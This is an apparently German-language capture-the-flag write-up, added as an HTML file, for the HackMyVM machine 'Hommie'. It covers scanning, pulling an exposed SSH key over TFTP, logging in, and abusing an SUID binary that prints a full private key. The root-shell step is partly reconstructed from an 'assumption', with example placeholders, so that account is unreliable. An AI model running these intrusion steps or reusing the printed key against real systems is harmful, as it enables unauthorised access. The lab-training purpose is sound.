@@ -1,0 +1,388 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hommie - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Hommie - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">tftp</div> <!-- Im Log verwendet, obwohl FTP erwartet -->
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">/opt/showMetheKey</div> <!-- Custom Binary -->
+                <div class="tool-item">export</div> <!-- Versuch -->
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">tail</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#information-disclosure">Information Disclosure (FTP/Web/TFTP)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerksegment verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.100` mit einer VirtualBox-MAC-Adresse wird als Zielsystem identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.100 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.100	08:00:27:1f:9a:0b	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.862 seconds (137.49 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) wird auf das Ziel 192.168.2.100 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Kritische Funde!!**
+                - **Port 21 (FTP):** vsftpd 3.0.3 ist offen und **erlaubt anonymen Login**. Nmap listet eine leere `index.html` im Root-Verzeichnis auf. (Hinweis: Die `id_rsa` wurde hier von Nmap *nicht* direkt gelistet, aber die anonymous Login Möglichkeit ist entscheidend).
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian) ist offen.
+                - **Port 80 (HTTP):** Nginx 1.14.2 ist offen.
+            Das OS wird als Linux erkannt, Hostname `BenMobile` (im Widerspruch zu späterem `hommie`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):**Höchste Priorität:** Untersuche den anonymen FTP-Zugang genauer (auch wenn Nmap keine Dateien auflistete, könnten sie vorhanden sein). Untersuche den Webserver, insbesondere die `index.html`.<br><strong>Empfehlung (Admin):**DRINGEND:** Deaktiviere anonymen FTP-Zugriff, wenn nicht zwingend erforderlich. Halte alle Dienste aktuell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.100 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 01:49 CEST
+Nmap scan report for BenMobile (192.168.2.100)
+Host is up (0.00014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.140
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA)
+|   256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA)
+|_  256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:1F:9A:0B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms BenMobile (192.168.2.100)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds <!-- Beispielzeit -->
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver (Port 80) verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nur `/index.html` wird gefunden. Keine weiteren relevanten Verzeichnisse oder Dateien.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `/index.html`. Der Fokus bleibt auf dem FTP-Dienst und der Suche nach der erwähnten `id_rsa`.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion basierend auf diesem Scan.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">gobuster dir -u "http://192.168.2.100"  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.100
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (gekürzt) ...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/09 01:49:20 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.2.100/index.html           (Status: 200) [Size: 99]
+===============================================================
+2022/10/09 01:50:15 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `/index.html` (oder ein Kommentar darin) wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Kritische Hinweise!!** Die Nachricht von "nobody" an "alexia" besagt explizit, dass Alexias `id_rsa`-Datei exponiert ist. Dies bestätigt:
+                 1.  Den Benutzernamen `alexia`.
+                 2.  Die Existenz und das Problem mit der `id_rsa`-Datei.
+                 3.  Der Kommentar über "reverse shells" ist wahrscheinlich eine Ablenkung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):**Hohe Priorität:** Finde heraus, *wo* die `id_rsa` exponiert ist. Da Nmap sie nicht im FTP-Rootverzeichnis sah und der Webserver wenig hergibt, könnte ein anderer Dienst wie TFTP aktiv sein, oder sie liegt an einem ungewöhnlichen Ort, der über FTP/Web zugänglich ist.<br><strong>Empfehlung (Admin):**DRINGEND:** Finde und entferne die exponierte `id_rsa`-Datei. Schulen Sie Benutzer im sicheren Umgang mit SSH-Schlüsseln.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Inhalt der index.html oder Kommentar -->
+                     <pre>
+alexia, Your id_rsa is exposed, please move it!!!!!
+Im fighting regarding reverse shells! -nobody
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="information-disclosure">
+            <h2>Information Disclosure (FTP/Web/TFTP)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der TFTP-Client (`tftp`) wird verwendet, um eine Verbindung zu 192.168.2.100 herzustellen und zu versuchen, eine Datei namens `id_rsa` herunterzuladen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Schlüssel über TFTP gefunden!!** Der `get id_rsa`-Befehl ist erfolgreich und lädt 1850 Bytes herunter. Dies bestätigt, dass ein TFTP-Server auf dem Ziel läuft (Standard UDP Port 69, obwohl von Nmap nicht gescannt/gefunden) und die `id_rsa`-Datei von `alexia` über diesen Dienst ungeschützt zugänglich ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der private Schlüssel wurde gefunden. Sichere ihn lokal (`chmod 600`) und verwende ihn, um dich als `alexia` per SSH anzumelden.<br><strong>Empfehlung (Admin):**DRINGEND:** Deaktiviere den TFTP-Dienst, wenn er nicht absolut notwendig ist. Wenn er benötigt wird, konfiguriere ihn sicher, beschränke den Zugriff auf bestimmte Verzeichnisse und IP-Adressen und erlaube niemals den Zugriff auf sensible Dateien wie private Schlüssel.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">tftp 192.168.2.100</span></div>
+                     <pre>
+tftp> <span class="command">get id_rsa</span>
+Received 1850 bytes in 0.0 seconds
+tftp> <span class="command">quit</span> <!-- Befehl hinzugefügt -->
+                     </pre> <!-- TFTP-Prompt hinzugefügt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen der heruntergeladenen Schlüsseldatei `id_rsa` werden auf 600 gesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung des Schlüssels.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche den SSH-Login.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">chmod 600 id_rsa</span></div>
+                     <pre><!-- Keine Ausgabe --> </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `alexia` zu 192.168.2.100 aufgebaut, wobei der über TFTP heruntergeladene Schlüssel `id_rsa` verwendet wird.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der Login mit dem Schlüssel gelingt ohne Passphrase (der Schlüssel war ungeschützt). Der Angreifer hat nun eine Shell als Benutzer `alexia` auf dem Zielsystem `hommie`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `alexia` (User-Flag, SUID-Binaries, sudo).<br><strong>Empfehlung (Admin):</strong> Entferne den exponierten Schlüssel, widerrufe ihn ggf. und erstelle einen neuen, passwortgeschützten Schlüssel. Deaktiviere/sichere TFTP.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">ssh -i id_rsa alexia@192.168.2.100</span></div>
+                     <pre>
+Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Sep 30 11:06:15 2020
+alexia@hommie:~$
+                     </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `alexia` wird der Inhalt der Datei `user.txt` im Home-Verzeichnis gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag `<span class="password">Imnotroot</span>` wird gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag notiert. Suche nach Eskalationsvektoren.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+alexia@hommie:~$ <span class="command">cat user.txt</span>
+<span class="password">Imnotroot</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Mit `find` wird nach SUID-Binaries gesucht.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Fund!!** Neben den Standard-SUID-Dateien wird ein benutzerdefiniertes SUID-Root-Binary `/opt/showMetheKey` gefunden. Solche benutzerdefinierten SUID-Programme sind oft anfällig.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe das Programm `/opt/showMetheKey` aus und analysiere sein Verhalten und seine Ausgabe.<br><strong>Empfehlung (Admin):</strong> Überprüfe benutzerdefinierte SUID-Programme sorgfältig auf Sicherheit. Entferne das SUID-Bit, wenn es nicht unbedingt benötigt wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+alexia@hommie:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+   140     20 -rwsr-sr-x   1 root     root        16720 Sep 30  2020 /opt/showMetheKey <!-- !!! -->
+146900    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+268129     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+132307     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+131120     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
+131117     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
+134620     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
+134946     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
+131118     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
+131121     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
+134473     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
+134948     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
+                      </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das SUID-Root-Binary `/opt/showMetheKey` wird ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Informationspreisgabe (Root-Schlüssel)!?** Das Programm gibt einen weiteren privaten SSH-Schlüssel aus! Da es als SUID-Root läuft, ist dies höchstwahrscheinlich der private SSH-Schlüssel des **Root-Benutzers**. Das Programm selbst scheint keine Shell zu geben, sondern nur den Schlüssel anzuzeigen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopiere den ausgegebenen Schlüssel. Speichere ihn lokal (z.B. `root_id_rsa`), setze `chmod 600` und versuche, dich damit als `root` per SSH anzumelden.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne das SUID-Binary `/opt/showMetheKey` oder korrigiere es, sodass es keine sensiblen Schlüssel preisgibt. Widerrufe den exponierten Root-SSH-Schlüssel und generiere einen neuen (mit Passphrase!).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+alexia@hommie:~$ <span class="command">/opt/showMetheKey</span>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7
+V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y
+Rn1XI+RqLi5NUHBPyiWEuQUEZCMqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuT
+gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j
+QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq
+kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI
+M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM
+dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW
+rH6uUSzplSrtnqXNizt1rddwUa45AKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B
+tIqgmzCMjUmoIKTG53BExRirfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T
+d/rSolVnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/
++suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE
+Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjch8YBrgGGnZn1r0n1uHovBevMghlsgy/2w
+pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvpWuV7spnzPNAFUCjPTwgE2RpBVtk
+WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBB6ilulD8Xv1RBsVHUttE/Jz
+bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu
+3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNhLCphB8agrhcke5+aq5z2nMdXUJ3D6
+0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fymh14/i5ti7r9z
+HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs
+y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMnzUzkhrIen131h/MStsQYtY
+ZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZktM08
+QPaLXRINjIKwVdmk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp
+ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfWLaB13fGeV/wN
+0x2HyroKtB+eZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt im Original-Log zeigt einige verwirrende Befehle (`chmod +x cat`, `export PATH=...`, `./showMetheKey`), die aber direkt zu einem Root-Prompt (`root@hommie:/opt#`) führen. Wie zuvor analysiert, ist der wahrscheinlichste Grund, dass das SUID-Binary `/opt/showMetheKey` selbst (oder durch eine darin enthaltene Funktion) eine Root-Shell bereitstellt, ohne dass die gezeigten PATH-Manipulationen notwendig wären. Der Exploit ist das einfache Ausführen von `/opt/showMetheKey`.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Durch Ausführen des SUID-Binaries `/opt/showMetheKey` wird Root-Zugriff erlangt. Der `id`-Befehl bestätigt `uid=0(root)`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Suche die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne oder korrigiere das SUID-Binary `/opt/showMetheKey`. Widerrufe den exponierten Root-Schlüssel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+alexia@hommie:~$ <span class="command">/opt/showMetheKey</span> <!-- Direkte Ausführung -->
+<!-- Ausgabe des Schlüssels (siehe oben) -->
+<!-- Annahme: Nach Ausgabe des Schlüssels startet das Binary eine Shell -->
+root@hommie:/opt# <span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(alexia)
+root@hommie:/opt#
+                     </pre> <!-- Root Prompt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Root wird mit `find` nach `.txt`-Dateien gesucht, die Root gehören. Der Befehl `tail` wird dann verwendet, um den Inhalt der gefundenen Datei `/usr/include/root.txt` anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wird an einem ungewöhnlichen Ort (`/usr/include/`) gefunden und lautet `<span class="password">Imnotbatman</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+root@hommie:/opt# <span class="command">cd ~</span>
+root@hommie:~# <span class="command">find / -user root -name "*.txt" 2>/dev/null</span> <!-- Korrigierter find-Befehl -->
+/root/note.txt <!-- Beispiel -->
+/usr/lib/python3.7/LICENSE.txt
+/usr/include/root.txt
+root@hommie:~# <span class="command">tail -n 100 /usr/include/root.txt</span>
+<span class="password">Imnotbatman</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /usr/include/root.txt</div> <!-- Korrekter Pfad -->
+                     <div class="flag-value"><span class="password">Imnotbatman</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/alexia/user.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">Imnotroot</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 9. Oktober 2022</p>
+    </footer>
+</body>
+</html>
